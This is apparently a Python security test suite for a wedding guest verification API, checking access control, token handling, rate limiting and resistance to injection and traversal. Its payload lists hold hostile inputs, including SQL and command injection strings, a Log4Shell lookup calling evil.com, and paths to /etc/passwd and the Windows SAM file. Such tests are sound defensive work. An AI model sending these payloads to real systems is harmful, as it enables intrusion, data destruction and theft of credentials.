"""
Security-focused Tests for Guest Verification System
Comprehensive security testing including access control validation,
authentication bypass attempts, and privacy protection verification.
"""

import pytest
import requests
import json
import time
import hashlib
import base64
from datetime import datetime, timedelta
from typing import Dict, Any, List

# Test Configuration
BASE_URL = "http://localhost:8002"

class GuestVerificationSecurityTests:
 """Security-focused test suite for guest verification system"""
 
 def __init__(self):
 self.base_url = BASE_URL
 self.security_results = {
 "access_control": {},
 "authentication_security": {},
 "data_protection": {},
 "privacy_controls": {},
 "attack_resistance": {},
 "vulnerabilities": [],
 "recommendations": []
 }
 
 def run_security_tests(self):
 """Run comprehensive security test suite"""
 print("=" * 80)
 print("GUEST VERIFICATION SYSTEM - SECURITY TEST SUITE")
 print("=" * 80)
 
 try:
 # 1. Test access control mechanisms
 self._test_access_control()
 
 # 2. Test authentication security
 self._test_authentication_security()
 
 # 3. Test data protection
 self._test_data_protection()
 
 # 4. Test privacy controls
 self._test_privacy_controls()
 
 # 5. Test attack resistance
 self._test_attack_resistance()
 
 # 6. Generate security report
 self._generate_security_report()
 
 except Exception as e:
 self.security_results["critical_error"] = str(e)
 print(f"CRITICAL SECURITY TEST ERROR: {str(e)}")
 
 return self.security_results
 
 def _test_access_control(self):
 """Test access control mechanisms"""
 print("\n Testing Access Control Mechanisms...")
 
 # Test 1: Private wedding access restrictions
 self._test_private_wedding_access_control()
 
 # Test 2: Admin endpoint protection
 self._test_admin_endpoint_protection()
 
 # Test 3: Cross-wedding access prevention
 self._test_cross_wedding_access()
 
 # Test 4: Guest data isolation
 self._test_guest_data_isolation()
 
 def _test_private_wedding_access_control(self):
 """Test that private weddings properly restrict access"""
 print(" Testing private wedding access control...")
 
 test_scenarios = [
 {
 "name": "no_credentials",
 "slug": "private-test-wedding",
 "data": {},
 "should_deny": True
 },
 {
 "name": "invalid_credentials",
 "slug": "private-test-wedding", 
 "data": {"name": "Fake Guest", "phone": "+9999999999"},
 "should_deny": True
 },
 {
 "name": "partial_credentials",
 "slug": "private-test-wedding",
 "data": {"name": "Real Guest"},
 "should_deny": True # Should deny if phone is required
 }
 ]
 
 access_control_results = {}
 
 for scenario in test_scenarios:
 try:
 response = requests.post(
 f"{self.base_url}/weddings/verify-guest-access/{scenario['slug']}",
 json=scenario["data"]
 )
 
 access_denied = response.status_code in [403, 404]
 security_correct = access_denied == scenario["should_deny"]
 
 access_control_results[scenario["name"]] = {
 "status": response.status_code,
 "access_denied": access_denied,
 "security_correct": security_correct,
 "response_size": len(response.content)
 }
 
 if not security_correct:
 self.security_results["vulnerabilities"].append(
 f"Access control issue in scenario: {scenario['name']}"
 )
 
 except Exception as e:
 access_control_results[scenario["name"]] = {"error": str(e)}
 
 self.security_results["access_control"]["private_wedding_access"] = access_control_results
 
 correct_controls = sum(1 for result in access_control_results.values() 
 if isinstance(result, dict) and result.get("security_correct", False))
 total_controls = len(access_control_results)
 
 print(f" Access control: {correct_controls}/{total_controls} scenarios secure")
 
 def _test_admin_endpoint_protection(self):
 """Test that admin endpoints are properly protected"""
 print(" Testing admin endpoint protection...")
 
 admin_endpoints = [
 "/admin/weddings",
 "/admin/weddings/test-id/privacy-settings",
 "/admin/weddings/test-id/access-logs",
 "/admin/users",
 "/admin/forms"
 ]
 
 admin_protection_results = {}
 
 for endpoint in admin_endpoints:
 try:
 # Attempt unauthorized access
 response = requests.get(f"{self.base_url}{endpoint}")
 
 protected = response.status_code in [401, 403]
 admin_protection_results[endpoint] = {
 "status": response.status_code,
 "protected": protected
 }
 
 if not protected:
 self.security_results["vulnerabilities"].append(
 f"Unprotected admin endpoint: {endpoint}"
 )
 
 except Exception as e:
 admin_protection_results[endpoint] = {"error": str(e)}
 
 self.security_results["access_control"]["admin_endpoints"] = admin_protection_results
 
 protected_count = sum(1 for result in admin_protection_results.values() 
 if isinstance(result, dict) and result.get("protected", False))
 
 print(f" Admin endpoints: {protected_count}/{len(admin_endpoints)} properly protected")
 
 def _test_cross_wedding_access(self):
 """Test prevention of cross-wedding data access"""
 print(" Testing cross-wedding access prevention...")
 
 # Simulate trying to access one wedding's data with another wedding's credentials
 cross_access_tests = [
 {
 "name": "wrong_slug_token_access",
 "url": "/weddings/guest-access/wedding-a/token-for-wedding-b",
 "should_deny": True
 },
 {
 "name": "guest_verification_wrong_wedding",
 "url": "/weddings/verify-guest-access/wedding-a",
 "data": {"name": "Guest From Wedding B", "phone": "+1111111111"},
 "should_deny": True
 }
 ]
 
 cross_access_results = {}
 
 for test in cross_access_tests:
 try:
 if "data" in test:
 response = requests.post(f"{self.base_url}{test['url']}", json=test["data"])
 else:
 response = requests.get(f"{self.base_url}{test['url']}")
 
 access_denied = response.status_code in [403, 404]
 security_correct = access_denied == test["should_deny"]
 
 cross_access_results[test["name"]] = {
 "status": response.status_code,
 "access_denied": access_denied,
 "security_correct": security_correct
 }
 
 if not security_correct:
 self.security_results["vulnerabilities"].append(
 f"Cross-wedding access vulnerability: {test['name']}"
 )
 
 except Exception as e:
 cross_access_results[test["name"]] = {"error": str(e)}
 
 self.security_results["access_control"]["cross_wedding_access"] = cross_access_results
 print(" Cross-wedding access prevention tested")
 
 def _test_guest_data_isolation(self):
 """Test that guest data is properly isolated"""
 print(" Testing guest data isolation...")
 
 # Test attempts to access guest data without proper authentication
 isolation_tests = [
 {
 "name": "direct_guest_data_access",
 "method": "GET",
 "path": "/admin/guests",
 "should_require_auth": True
 },
 {
 "name": "guest_list_enumeration",
 "method": "GET", 
 "path": "/guests", # Check if there's an unprotected guest list endpoint
 "should_require_auth": True
 }
 ]
 
 isolation_results = {}
 
 for test in isolation_tests:
 try:
 if test["method"] == "GET":
 response = requests.get(f"{self.base_url}{test['path']}")
 else:
 response = requests.post(f"{self.base_url}{test['path']}")
 
 auth_required = response.status_code in [401, 403, 404]
 security_correct = auth_required == test["should_require_auth"]
 
 isolation_results[test["name"]] = {
 "status": response.status_code,
 "auth_required": auth_required,
 "security_correct": security_correct
 }
 
 if not security_correct:
 self.security_results["vulnerabilities"].append(
 f"Guest data isolation issue: {test['name']}"
 )
 
 except Exception as e:
 isolation_results[test["name"]] = {"error": str(e)}
 
 self.security_results["access_control"]["guest_data_isolation"] = isolation_results
 print(" Guest data isolation tested")
 
 def _test_authentication_security(self):
 """Test authentication security mechanisms"""
 print("\n Testing Authentication Security...")
 
 # Test 1: Token validation security
 self._test_token_validation()
 
 # Test 2: Password strength validation
 self._test_password_validation()
 
 # Test 3: Session management
 self._test_session_management()
 
 # Test 4: Brute force protection
 self._test_brute_force_protection()
 
 def _test_token_validation(self):
 """Test guest token validation security"""
 print(" Testing token validation...")
 
 invalid_tokens = [
 "invalid-token",
 "",
 "a" * 1000, # Very long token
 "../../etc/passwd", # Path traversal attempt
 "<script>alert('xss')</script>", # XSS attempt
 "'; DROP TABLE tokens; --", # SQL injection attempt
 "null",
 "undefined",
 "admin",
 "guest",
 "12345"
 ]
 
 token_validation_results = {}
 
 for token in invalid_tokens:
 try:
 response = requests.get(
 f"{self.base_url}/weddings/guest-access/test-wedding/{token}"
 )
 
 properly_rejected = response.status_code in [403, 404, 400]
 token_validation_results[token[:20]] = {
 "status": response.status_code,
 "properly_rejected": properly_rejected
 }
 
 if not properly_rejected:
 self.security_results["vulnerabilities"].append(
 f"Invalid token accepted: {token[:20]}"
 )
 
 except Exception as e:
 token_validation_results[token[:20]] = {"error": str(e)}
 
 self.security_results["authentication_security"]["token_validation"] = token_validation_results
 
 secure_rejections = sum(1 for result in token_validation_results.values() 
 if isinstance(result, dict) and result.get("properly_rejected", False))
 
 print(f" Token validation: {secure_rejections}/{len(invalid_tokens)} invalid tokens properly rejected")
 
 def _test_password_validation(self):
 """Test password protection security"""
 print(" Testing password validation...")
 
 weak_passwords = [
 "",
 "password",
 "123456",
 "admin",
 "guest", 
 "a",
 " ", # Space
 "password123" # Common weak password
 ]
 
 password_tests = {}
 
 for password in weak_passwords:
 try:
 response = requests.post(
 f"{self.base_url}/weddings/verify-guest-access/password-protected-wedding",
 json={"password": password}
 )
 
 properly_rejected = response.status_code in [403, 404, 400]
 password_tests[f"weak_password_{len(password)}"] = {
 "status": response.status_code,
 "properly_rejected": properly_rejected
 }
 
 except Exception as e:
 password_tests[f"weak_password_{len(password)}"] = {"error": str(e)}
 
 self.security_results["authentication_security"]["password_validation"] = password_tests
 print(" Password validation tested")
 
 def _test_session_management(self):
 """Test session management security"""
 print(" Testing session management...")
 
 # Test for session-related vulnerabilities
 session_tests = {
 "session_fixation": self._test_session_fixation(),
 "session_timeout": self._test_session_timeout(),
 "concurrent_sessions": self._test_concurrent_sessions()
 }
 
 self.security_results["authentication_security"]["session_management"] = session_tests
 print(" Session management tested")
 
 def _test_session_fixation(self):
 """Test for session fixation vulnerabilities"""
 # Since this is primarily a stateless API, session fixation may not apply
 # But we test for any session-like behavior
 try:
 response1 = requests.get(f"{self.base_url}/weddings/privacy-info/test")
 response2 = requests.get(f"{self.base_url}/weddings/privacy-info/test")
 
 # Check if responses are consistent (good) and don't leak session info
 return {
 "consistent_responses": response1.status_code == response2.status_code,
 "no_session_headers": "Set-Cookie" not in response1.headers
 }
 except:
 return {"error": "Session fixation test failed"}
 
 def _test_session_timeout(self):
 """Test session timeout mechanisms"""
 # For JWT-based auth, this would test token expiration
 return {"note": "JWT-based auth - timeout tested separately"}
 
 def _test_concurrent_sessions(self):
 """Test concurrent session handling"""
 # Test multiple simultaneous requests
 try:
 import threading
 import queue
 
 results_queue = queue.Queue()
 
 def make_request():
 response = requests.get(f"{self.base_url}/weddings/privacy-info/test")
 results_queue.put(response.status_code)
 
 # Create multiple concurrent requests
 threads = []
 for _ in range(5):
 thread = threading.Thread(target=make_request)
 threads.append(thread)
 thread.start()
 
 # Wait for all threads
 for thread in threads:
 thread.join()
 
 # Collect results
 status_codes = []
 while not results_queue.empty():
 status_codes.append(results_queue.get())
 
 return {
 "concurrent_requests": len(status_codes),
 "consistent_responses": len(set(status_codes)) <= 2 # Allow for 404 and other reasonable codes
 }
 
 except Exception as e:
 return {"error": str(e)}
 
 def _test_brute_force_protection(self):
 """Test brute force attack protection"""
 print(" Testing brute force protection...")
 
 # Attempt rapid authentication requests
 brute_force_results = {
 "requests_attempted": 0,
 "rate_limited": False,
 "progressive_delay": False
 }
 
 try:
 start_time = time.time()
 
 for i in range(50): # Attempt 50 rapid requests
 response = requests.post(
 f"{self.base_url}/weddings/verify-guest-access/test-wedding",
 json={"name": "brute", "phone": "force"},
 timeout=2
 )
 
 brute_force_results["requests_attempted"] += 1
 
 if response.status_code == 429: # Too Many Requests
 brute_force_results["rate_limited"] = True
 brute_force_results["rate_limited_at"] = i + 1
 break
 
 # Check for progressive delays
 if i > 0 and time.time() - start_time > i * 0.1: # Expected delay increase
 brute_force_results["progressive_delay"] = True
 
 time.sleep(0.01) # Small delay between requests
 
 except requests.exceptions.Timeout:
 brute_force_results["timeout_protection"] = True
 except Exception as e:
 brute_force_results["error"] = str(e)
 
 self.security_results["authentication_security"]["brute_force_protection"] = brute_force_results
 
 if brute_force_results["rate_limited"]:
 print(" Brute force protection active")
 else:
 print(" No brute force protection detected")
 self.security_results["recommendations"].append(
 "Implement rate limiting to prevent brute force attacks"
 )
 
 def _test_data_protection(self):
 """Test data protection mechanisms"""
 print("\n Testing Data Protection...")
 
 # Test 1: Sensitive data exposure
 self._test_sensitive_data_exposure()
 
 # Test 2: Data encryption in transit
 self._test_data_encryption()
 
 # Test 3: Input sanitization
 self._test_input_sanitization()
 
 # Test 4: Output encoding
 self._test_output_encoding()
 
 def _test_sensitive_data_exposure(self):
 """Test for sensitive data exposure"""
 print(" Testing sensitive data exposure...")
 
 # Test if error messages leak sensitive information
 test_requests = [
 {
 "name": "database_error_exposure",
 "url": f"{self.base_url}/weddings/verify-guest-access/test",
 "method": "POST",
 "data": {"name": "'; SELECT * FROM users; --"}
 },
 {
 "name": "file_path_exposure", 
 "url": f"{self.base_url}/weddings/privacy-info/../../etc/passwd"
 },
 {
 "name": "stack_trace_exposure",
 "url": f"{self.base_url}/weddings/verify-guest-access/test",
 "method": "POST",
 "data": {"invalid": "data", "structure": {"nested": "error"}}
 }
 ]
 
 exposure_results = {}
 
 for test in test_requests:
 try:
 if test.get("method") == "POST":
 response = requests.post(test["url"], json=test.get("data", {}))
 else:
 response = requests.get(test["url"])
 
 response_text = response.text.lower()
 
 # Check for sensitive data leakage indicators
 sensitive_indicators = [
 "traceback", "stack trace", "error:", "exception:",
 "file not found", "permission denied", "access denied",
 "database", "sql", "mongo", "redis",
 "/home/", "/var/", "/etc/", "c:\\\\",
 "password", "token", "secret", "key"
 ]
 
 leaked_indicators = [indicator for indicator in sensitive_indicators 
 if indicator in response_text]
 
 exposure_results[test["name"]] = {
 "status": response.status_code,
 "potential_leaks": leaked_indicators,
 "response_length": len(response.text),
 "safe": len(leaked_indicators) == 0
 }
 
 if leaked_indicators:
 self.security_results["vulnerabilities"].append(
 f"Potential sensitive data exposure in {test['name']}: {leaked_indicators[:3]}"
 )
 
 except Exception as e:
 exposure_results[test["name"]] = {"error": str(e)}
 
 self.security_results["data_protection"]["sensitive_data_exposure"] = exposure_results
 
 safe_responses = sum(1 for result in exposure_results.values() 
 if isinstance(result, dict) and result.get("safe", False))
 
 print(f" Sensitive data exposure: {safe_responses}/{len(test_requests)} responses safe")
 
 def _test_data_encryption(self):
 """Test data encryption in transit"""
 print(" Testing data encryption...")
 
 # Check if HTTPS is enforced
 encryption_results = {}
 
 try:
 # Test HTTP redirect to HTTPS (in production)
 if "localhost" not in self.base_url:
 http_url = self.base_url.replace("https://", "http://")
 response = requests.get(f"{http_url}/health/status", allow_redirects=False)
 
 encryption_results["http_redirect"] = {
 "status": response.status_code,
 "redirects_to_https": response.status_code in [301, 302, 307, 308]
 }
 else:
 encryption_results["http_redirect"] = {"note": "Localhost testing - HTTPS redirect not applicable"}
 
 # Check security headers
 response = requests.get(f"{self.base_url}/health/status")
 security_headers = {
 "Strict-Transport-Security": "HSTS" in response.headers.get("Strict-Transport-Security", ""),
 "X-Content-Type-Options": response.headers.get("X-Content-Type-Options") == "nosniff",
 "X-Frame-Options": response.headers.get("X-Frame-Options") in ["DENY", "SAMEORIGIN"],
 "Content-Security-Policy": "Content-Security-Policy" in response.headers
 }
 
 encryption_results["security_headers"] = security_headers
 
 except Exception as e:
 encryption_results["error"] = str(e)
 
 self.security_results["data_protection"]["encryption"] = encryption_results
 print(" Data encryption tested")
 
 def _test_input_sanitization(self):
 """Test input sanitization"""
 print(" Testing input sanitization...")
 
 malicious_inputs = [
 "<script>alert('xss')</script>",
 "javascript:alert('xss')",
 "'; DROP TABLE guests; --",
 "' OR '1'='1' --",
 "../../../etc/passwd",
 "{{7*7}}",
 "${jndi:ldap://evil.com/a}",
 "%3Cscript%3Ealert('xss')%3C/script%3E",
 "\\x3cscript\\x3ealert('xss')\\x3c/script\\x3e"
 ]
 
 sanitization_results = {}
 
 for payload in malicious_inputs:
 try:
 response = requests.post(
 f"{self.base_url}/weddings/verify-guest-access/test",
 json={"name": payload, "phone": payload}
 )
 
 # Check if malicious payload is reflected unsanitized
 response_text = response.text.lower()
 payload_reflected = payload.lower() in response_text
 
 sanitization_results[payload[:30]] = {
 "status": response.status_code,
 "payload_reflected": payload_reflected,
 "properly_sanitized": not payload_reflected or response.status_code >= 400
 }
 
 if payload_reflected and response.status_code < 400:
 self.security_results["vulnerabilities"].append(
 f"Potential XSS vulnerability with payload: {payload[:30]}"
 )
 
 except Exception as e:
 sanitization_results[payload[:30]] = {"error": str(e)}
 
 self.security_results["data_protection"]["input_sanitization"] = sanitization_results
 
 safe_inputs = sum(1 for result in sanitization_results.values() 
 if isinstance(result, dict) and result.get("properly_sanitized", False))
 
 print(f" Input sanitization: {safe_inputs}/{len(malicious_inputs)} inputs properly sanitized")
 
 def _test_output_encoding(self):
 """Test output encoding"""
 print(" Testing output encoding...")
 
 # Test if outputs are properly encoded
 encoding_test_data = {
 "name": "<test&user>",
 "phone": "555-TEST&PHONE"
 }
 
 try:
 response = requests.post(
 f"{self.base_url}/weddings/verify-guest-access/test",
 json=encoding_test_data
 )
 
 response_text = response.text
 
 # Check if special characters are properly encoded
 properly_encoded = (
 "&lt;" in response_text or "<test&user>" not in response_text
 )
 
 encoding_results = {
 "status": response.status_code,
 "properly_encoded": properly_encoded,
 "response_contains_raw_html": "<script" in response_text.lower()
 }
 
 except Exception as e:
 encoding_results = {"error": str(e)}
 
 self.security_results["data_protection"]["output_encoding"] = encoding_results
 print(" Output encoding tested")
 
 def _test_privacy_controls(self):
 """Test privacy control mechanisms"""
 print("\n Testing Privacy Controls...")
 
 # Test 1: Wedding privacy mode enforcement
 self._test_privacy_mode_enforcement()
 
 # Test 2: Guest data privacy
 self._test_guest_data_privacy()
 
 # Test 3: Information disclosure prevention
 self._test_information_disclosure()
 
 def _test_privacy_mode_enforcement(self):
 """Test privacy mode enforcement"""
 print(" Testing privacy mode enforcement...")
 
 privacy_modes = ["public", "private", "password"]
 enforcement_results = {}
 
 for mode in privacy_modes:
 try:
 # Test wedding by slug endpoint (should be restricted for private)
 response = requests.get(f"{self.base_url}/weddings/slug/test-{mode}-wedding")
 
 if mode == "public":
 # Public weddings might allow direct access or return limited info
 enforcement_results[mode] = {
 "status": response.status_code,
 "allows_access": response.status_code == 200,
 "note": "Public wedding should allow some access"
 }
 else:
 # Private and password-protected should require verification
 access_restricted = response.status_code in [403, 404] or "authentication" in response.text.lower()
 enforcement_results[mode] = {
 "status": response.status_code,
 "properly_restricted": access_restricted
 }
 
 if not access_restricted:
 self.security_results["vulnerabilities"].append(
 f"Privacy mode {mode} not properly enforced"
 )
 
 except Exception as e:
 enforcement_results[mode] = {"error": str(e)}
 
 self.security_results["privacy_controls"]["privacy_mode_enforcement"] = enforcement_results
 print(" Privacy mode enforcement tested")
 
 def _test_guest_data_privacy(self):
 """Test guest data privacy protection"""
 print(" Testing guest data privacy...")
 
 # Test attempts to enumerate or access guest data
 privacy_tests = [
 {
 "name": "guest_enumeration",
 "url": f"{self.base_url}/guest/search",
 "method": "GET",
 "should_require_auth": True
 },
 {
 "name": "guest_list_access",
 "url": f"{self.base_url}/admin/guests",
 "method": "GET", 
 "should_require_auth": True
 }
 ]
 
 privacy_results = {}
 
 for test in privacy_tests:
 try:
 if test["method"] == "GET":
 response = requests.get(test["url"])
 else:
 response = requests.post(test["url"])
 
 requires_auth = response.status_code in [401, 403]
 privacy_protected = requires_auth == test["should_require_auth"]
 
 privacy_results[test["name"]] = {
 "status": response.status_code,
 "requires_auth": requires_auth,
 "privacy_protected": privacy_protected
 }
 
 if not privacy_protected:
 self.security_results["vulnerabilities"].append(
 f"Guest data privacy issue: {test['name']}"
 )
 
 except Exception as e:
 privacy_results[test["name"]] = {"error": str(e)}
 
 self.security_results["privacy_controls"]["guest_data_privacy"] = privacy_results
 print(" Guest data privacy tested")
 
 def _test_information_disclosure(self):
 """Test information disclosure prevention"""
 print(" Testing information disclosure prevention...")
 
 # Test for information leakage in error messages and responses
 disclosure_tests = [
 {
 "name": "error_message_disclosure",
 "url": f"{self.base_url}/weddings/verify-guest-access/nonexistent",
 "method": "POST",
 "data": {"name": "test"}
 },
 {
 "name": "endpoint_enumeration",
 "url": f"{self.base_url}/weddings/definitely-not-real-wedding"
 }
 ]
 
 disclosure_results = {}
 
 for test in disclosure_tests:
 try:
 if test.get("method") == "POST":
 response = requests.post(test["url"], json=test.get("data", {}))
 else:
 response = requests.get(test["url"])
 
 response_text = response.text.lower()
 
 # Check for information disclosure indicators
 disclosure_indicators = [
 "internal error", "stack trace", "debug",
 "file not found", "permission denied",
 "database error", "connection refused"
 ]
 
 disclosed_info = [indicator for indicator in disclosure_indicators 
 if indicator in response_text]
 
 disclosure_results[test["name"]] = {
 "status": response.status_code,
 "disclosed_info": disclosed_info,
 "information_leaked": len(disclosed_info) > 0
 }
 
 if disclosed_info:
 self.security_results["vulnerabilities"].append(
 f"Information disclosure in {test['name']}: {disclosed_info}"
 )
 
 except Exception as e:
 disclosure_results[test["name"]] = {"error": str(e)}
 
 self.security_results["privacy_controls"]["information_disclosure"] = disclosure_results
 print(" Information disclosure prevention tested")
 
 def _test_attack_resistance(self):
 """Test resistance to common attacks"""
 print("\n Testing Attack Resistance...")
 
 # Test 1: CSRF protection
 self._test_csrf_protection()
 
 # Test 2: Injection attacks
 self._test_injection_attacks()
 
 # Test 3: Directory traversal
 self._test_directory_traversal()
 
 # Test 4: DoS resistance
 self._test_dos_resistance()
 
 def _test_csrf_protection(self):
 """Test CSRF protection"""
 print(" Testing CSRF protection...")
 
 csrf_results = {}
 
 # Test state-changing operations without CSRF tokens
 csrf_test_requests = [
 {
 "name": "guest_verification_csrf",
 "url": f"{self.base_url}/weddings/verify-guest-access/test",
 "method": "POST",
 "data": {"name": "test"}
 }
 ]
 
 for test in csrf_test_requests:
 try:
 # Make request without CSRF token
 response = requests.post(test["url"], json=test["data"])
 
 # Check if CSRF protection is active
 csrf_protected = (
 response.status_code == 403 or
 "csrf" in response.text.lower() or
 "forbidden" in response.text.lower()
 )
 
 csrf_results[test["name"]] = {
 "status": response.status_code,
 "csrf_protected": csrf_protected
 }
 
 except Exception as e:
 csrf_results[test["name"]] = {"error": str(e)}
 
 # Note: CSRF protection might not be required for API endpoints that don't rely on cookies
 csrf_results["note"] = "CSRF protection may not be applicable for JWT-based API"
 
 self.security_results["attack_resistance"]["csrf_protection"] = csrf_results
 print(" CSRF protection tested")
 
 def _test_injection_attacks(self):
 """Test injection attack resistance"""
 print(" Testing injection attack resistance...")
 
 injection_payloads = [
 # SQL Injection
 "'; DROP TABLE guests; --",
 "' OR '1'='1' --",
 "'; UPDATE weddings SET public=true; --",
 
 # NoSQL Injection
 "'; db.weddings.drop(); //",
 "'; this.constructor.constructor('return process')().exit(); //",
 
 # Command Injection
 "; ls -la",
 "| cat /etc/passwd",
 "&& whoami",
 
 # LDAP Injection
 "*(objectClass=*)",
 "admin)(|(password=*))",
 
 # XPath Injection
 "' or '1'='1",
 "' or position()=1 or '"
 ]
 
 injection_results = {}
 
 for payload in injection_payloads:
 try:
 response = requests.post(
 f"{self.base_url}/weddings/verify-guest-access/test",
 json={"name": payload, "phone": payload}
 )
 
 # Check for signs of successful injection
 response_text = response.text.lower()
 injection_indicators = [
 "error", "exception", "syntax", "unexpected",
 "database", "collection", "table", "query"
 ]
 
 potential_injection = any(indicator in response_text for indicator in injection_indicators)
 
 injection_results[payload[:30]] = {
 "status": response.status_code,
 "potential_injection": potential_injection,
 "handled_safely": response.status_code in [400, 403, 422] and not potential_injection
 }
 
 if potential_injection:
 self.security_results["vulnerabilities"].append(
 f"Potential injection vulnerability with: {payload[:30]}"
 )
 
 except Exception as e:
 injection_results[payload[:30]] = {"error": str(e)}
 
 self.security_results["attack_resistance"]["injection_attacks"] = injection_results
 
 safe_handling = sum(1 for result in injection_results.values() 
 if isinstance(result, dict) and result.get("handled_safely", False))
 
 print(f" Injection resistance: {safe_handling}/{len(injection_payloads)} payloads handled safely")
 
 def _test_directory_traversal(self):
 """Test directory traversal attack resistance"""
 print(" Testing directory traversal resistance...")
 
 traversal_payloads = [
 "../../../etc/passwd",
 "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
 "....//....//....//etc//passwd",
 "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
 "..%252f..%252f..%252fetc%252fpasswd"
 ]
 
 traversal_results = {}
 
 for payload in traversal_payloads:
 try:
 # Test in URL path
 response = requests.get(f"{self.base_url}/weddings/privacy-info/{payload}")
 
 # Check for signs of successful traversal
 response_text = response.text.lower()
 traversal_indicators = [
 "root:", "admin:", "password:", "etc/passwd",
 "windows", "system32", "access denied"
 ]
 
 potential_traversal = any(indicator in response_text for indicator in traversal_indicators)
 
 traversal_results[payload[:30]] = {
 "status": response.status_code,
 "potential_traversal": potential_traversal,
 "handled_safely": response.status_code in [400, 404] and not potential_traversal
 }
 
 if potential_traversal:
 self.security_results["vulnerabilities"].append(
 f"Potential directory traversal with: {payload[:30]}"
 )
 
 except Exception as e:
 traversal_results[payload[:30]] = {"error": str(e)}
 
 self.security_results["attack_resistance"]["directory_traversal"] = traversal_results
 
 safe_handling = sum(1 for result in traversal_results.values() 
 if isinstance(result, dict) and result.get("handled_safely", False))
 
 print(f" Directory traversal resistance: {safe_handling}/{len(traversal_payloads)} attempts blocked")
 
 def _test_dos_resistance(self):
 """Test Denial of Service resistance"""
 print(" Testing DoS resistance...")
 
 dos_results = {}
 
 # Test 1: Large payload handling
 try:
 large_payload = {"name": "A" * 100000, "phone": "B" * 100000}
 
 start_time = time.time()
 response = requests.post(
 f"{self.base_url}/weddings/verify-guest-access/test",
 json=large_payload,
 timeout=10
 )
 response_time = time.time() - start_time
 
 dos_results["large_payload"] = {
 "status": response.status_code,
 "response_time": response_time,
 "handled_efficiently": response_time < 5 and response.status_code in [400, 413, 422]
 }
 
 except requests.exceptions.Timeout:
 dos_results["large_payload"] = {"timeout": True, "potentially_vulnerable": True}
 except Exception as e:
 dos_results["large_payload"] = {"error": str(e)}
 
 # Test 2: Concurrent request handling
 try:
 import threading
 
 def make_request():
 requests.get(f"{self.base_url}/weddings/privacy-info/test", timeout=5)
 
 start_time = time.time()
 threads = []
 
 # Create 20 concurrent requests
 for _ in range(20):
 thread = threading.Thread(target=make_request)
 threads.append(thread)
 thread.start()
 
 # Wait for all threads
 for thread in threads:
 thread.join()
 
 total_time = time.time() - start_time
 
 dos_results["concurrent_requests"] = {
 "total_time": total_time,
 "handles_concurrency": total_time < 10 # Should handle 20 requests in under 10 seconds
 }
 
 except Exception as e:
 dos_results["concurrent_requests"] = {"error": str(e)}
 
 self.security_results["attack_resistance"]["dos_resistance"] = dos_results
 print(" DoS resistance tested")
 
 def _generate_security_report(self):
 """Generate comprehensive security report"""
 print("\n" + "=" * 80)
 print("GUEST VERIFICATION SYSTEM - SECURITY REPORT")
 print("=" * 80)
 
 # Count vulnerabilities and issues
 total_vulnerabilities = len(self.security_results["vulnerabilities"])
 
 # Security score calculation
 security_tests = [
 self.security_results.get("access_control", {}),
 self.security_results.get("authentication_security", {}),
 self.security_results.get("data_protection", {}),
 self.security_results.get("privacy_controls", {}),
 self.security_results.get("attack_resistance", {})
 ]
 
 total_tests = sum(len(category) for category in security_tests)
 
 print(f"\n SECURITY ASSESSMENT SUMMARY:")
 print("-" * 50)
 print(f"Total Security Tests: {total_tests}")
 print(f"Vulnerabilities Found: {total_vulnerabilities}")
 print(f"Recommendations Generated: {len(self.security_results.get('recommendations', []))}")
 
 # Security rating
 if total_vulnerabilities == 0:
 security_rating = "EXCELLENT"
 rating_color = ""
 elif total_vulnerabilities <= 2:
 security_rating = "GOOD"
 rating_color = ""
 elif total_vulnerabilities <= 5:
 security_rating = "FAIR"
 rating_color = ""
 else:
 security_rating = "POOR"
 rating_color = ""
 
 print(f"\n{rating_color} SECURITY RATING: {security_rating}")
 
 # Detailed findings
 if total_vulnerabilities > 0:
 print(f"\n SECURITY VULNERABILITIES:")
 print("-" * 40)
 for i, vuln in enumerate(self.security_results["vulnerabilities"], 1):
 print(f"{i}. {vuln}")
 
 # Security strengths
 print(f"\n SECURITY STRENGTHS:")
 print("-" * 40)
 
 strengths = []
 
 # Check access control
 access_control = self.security_results.get("access_control", {})
 if access_control.get("admin_endpoints"):
 protected_endpoints = sum(1 for result in access_control["admin_endpoints"].values() 
 if isinstance(result, dict) and result.get("protected", False))
 total_endpoints = len(access_control["admin_endpoints"])
 if protected_endpoints == total_endpoints:
 strengths.append("Admin endpoints properly protected")
 
 # Check injection protection
 attack_resistance = self.security_results.get("attack_resistance", {})
 if attack_resistance.get("injection_attacks"):
 safe_injections = sum(1 for result in attack_resistance["injection_attacks"].values() 
 if isinstance(result, dict) and result.get("handled_safely", False))
 total_injections = len(attack_resistance["injection_attacks"])
 if safe_injections > total_injections * 0.8: # 80% threshold
 strengths.append("Good injection attack protection")
 
 # Check data protection
 data_protection = self.security_results.get("data_protection", {})
 if data_protection.get("sensitive_data_exposure"):
 safe_responses = sum(1 for result in data_protection["sensitive_data_exposure"].values() 
 if isinstance(result, dict) and result.get("safe", False))
 total_responses = len(data_protection["sensitive_data_exposure"])
 if safe_responses == total_responses:
 strengths.append("No sensitive data exposure detected")
 
 if not strengths:
 strengths = ["System requires security improvements"]
 
 for strength in strengths:
 print(f"• {strength}")
 
 # Recommendations
 print(f"\n SECURITY RECOMMENDATIONS:")
 print("-" * 40)
 
 default_recommendations = [
 "Implement comprehensive audit logging for all guest verification events",
 "Add rate limiting to prevent brute force attacks",
 "Implement CSRF protection for state-changing operations",
 "Use HTTPS in production with proper SSL/TLS configuration",
 "Implement input validation and output encoding",
 "Regular security testing and vulnerability assessments",
 "Monitor for suspicious access patterns",
 "Implement proper error handling without information disclosure"
 ]
 
 all_recommendations = self.security_results.get("recommendations", []) + default_recommendations
 
 for i, recommendation in enumerate(set(all_recommendations), 1):
 print(f"{i}. {recommendation}")
 
 # Export security report
 self._export_security_report()
 
 def _export_security_report(self):
 """Export detailed security report"""
 try:
 timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
 filename = f"guest_verification_security_report_{timestamp}.json"
 
 with open(filename, 'w') as f:
 json.dump(self.security_results, f, indent=2, default=str)
 
 print(f"\n Detailed security report exported to: {filename}")
 
 except Exception as e:
 print(f" Could not export security report: {str(e)}")

def main():
 """Main security test execution function"""
 print("Starting Guest Verification System Security Tests...")
 
 # Create and run security test suite
 security_suite = GuestVerificationSecurityTests()
 results = security_suite.run_security_tests()
 
 return results

if __name__ == "__main__":
 main()